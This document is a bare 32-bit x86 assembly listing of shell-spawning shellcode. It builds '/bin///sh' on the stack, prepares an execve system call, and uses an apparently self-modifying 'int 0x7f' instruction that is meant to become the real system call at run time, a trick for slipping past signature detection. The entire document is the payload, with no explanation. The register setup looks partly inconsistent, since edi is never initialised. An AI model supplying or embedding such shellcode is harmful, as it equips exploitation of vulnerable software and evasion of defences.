bits 32
global _start 
_start: 
push 0x68
push 0x732f2f2f
push 0x6e69622f 
push esp 
pop ebx 
xor ecx,ecx 
push 0x0b 
pop eax 
xor edx, edx 
push 0xe7ff5f 
call _nextins

_nextins: 
inc byte[edi+5] 
int 0x7f
